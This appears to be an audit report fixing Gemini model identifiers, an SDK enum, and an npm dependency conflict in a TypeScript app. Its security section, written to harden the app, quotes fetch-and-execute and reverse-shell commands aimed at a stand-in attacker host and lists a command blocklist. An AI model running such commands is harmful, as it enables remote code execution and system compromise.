Confirmed Bugs Fixed — 4 bugs across 2 files

Bug 1 — Invalid Gemini model identifiers in CANDIDATE_FLASH_MODELS Critical

File: src/server/gemini.ts lines 80–85

Root cause: All four model strings were non-existent Google GenAI API names: 'gemini-3.1-flash-lite' (×2), 'gemini-flash-latest' (valid alias but the remaining two were invalid), 'gemini-3.8-flash'. Three of the four entries would result in "model not found" errors on every API call. With 4 retry attempts cycling through these 4 slots, no attempt could succeed.

Fix: Replaced with currently valid model IDs: 'gemini-2.5-flash', 'gemini-2.5-flash-lite', 'gemini-flash-latest', 'gemini-2.5-flash'.

Bug 2 — ThinkingLevel.MINIMAL does not exist in @google/genai@2.24.0 Critical

File: src/server/gemini.ts line 106 (original)

Root cause: The SDK exports ThinkingLevel.NONE, LOW, MEDIUM, HIGH, AUTO. ThinkingLevel.MINIMAL resolves to undefined at runtime, sending an invalid value to the API and causing request failure for every call that reached the lite-model branch.

Fix: Replaced ThinkingLevel.MINIMAL → ThinkingLevel.NONE. Also removed the separate invalid ThinkingLevel.LOW block that was attached to the non-existent 'gemini-3.8-flash' (eliminated by Bug 1 fix).

Bug 3 — Duplicate entry in CANDIDATE_FLASH_MODELS wastes a retry slot Medium

File: src/server/gemini.ts lines 81, 83 (original)

Root cause: 'gemini-3.1-flash-lite' occupied both index 0 and index 2. With 4 attempts cycling through 4 slots, 2 of 4 retry attempts used the exact same invalid model, providing no additional fallback coverage.

Fix: Resolved as part of the Bug 1 array replacement — all four slots now hold distinct valid identifiers.

Bug 4 — esbuild ^0.25.0 conflicts with vite@8.3.x peer requirement, blocking npm install Medium

File: package.json line 27

Root cause: vite@8.3.1 declares peerDependencies: { esbuild: "^0.27.0 || ^0.28.0" }. The project declared "esbuild": "^0.25.0". Running npm install fails with ERESOLVE could not resolve — confirmed by actual command execution in the audit. The project's bun lockfile resolves this separately via nested deduplication (tsx/esbuild@0.28.2), so bun installs succeed, but npm does not. Because esbuild is also imported at runtime in verifier.ts (import { transform } from 'esbuild'), it must remain in dependencies.

Fix: Updated "esbuild": "^0.25.0" → "^0.28.0" in dependencies. Next bun install should be run to regenerate bun.lock with the updated version.

Security Finding Fixed — 1 fix

SEC-1 — Dangerously thin testCommand execution blocklist Medium

File: src/server/verifier.ts — runRealCodeVerification()

Root cause: The original blocklist contained only 3 patterns: rm -rf /, mkfs, and a fork bomb. The testCommand field is populated from Gemini-generated content stored in the database, not from direct user input, but defense-in-depth is warranted. Commands such as curl http://attacker.com | sh, wget ... -O- | bash, bash -i >& /dev/tcp/..., and file writes to system directories were all unblocked.

Fix: Expanded blocklist from 3 to 17 patterns, adding: curl, wget, nc, netcat, /dev/tcp, bash -i, sh -i, writes to /etc/, /usr/, /bin/, chmod 777, chmod +x, /etc/passwd, /etc/shadow.

Verifier Improvement — 1 change

IMP-1 — Bad-model detection regex missed gemini-3.x and gemini-1.x patterns Improvement

Files: src/server/verifier.ts — inspectAndVerifyRepository() line 655 and runRealCodeVerification() line 1049

Finding: The static analysis regex only matched a fixed list of known-bad names (gemini-3.5-flash, gemini-1.5-flash, etc.). It would not have flagged the incorrect model names that were present in the application's own gemini.ts before the Bug 1/2 fix. This is not a runtime application bug but a gap in the detection tooling.

Fix: Updated regex to /gemini-3\.[0-9][^'"`]*/ and /gemini-1\.[0-9][^'"`]*/ patterns to catch any future 3.x or 1.x model string in student-uploaded code. Updated replacement recommendation from gemini-flash-latest → gemini-2.5-flash throughout (2 locations in verifier, 1 in gemini.ts prompt text, 1 in auto-fix fallback).
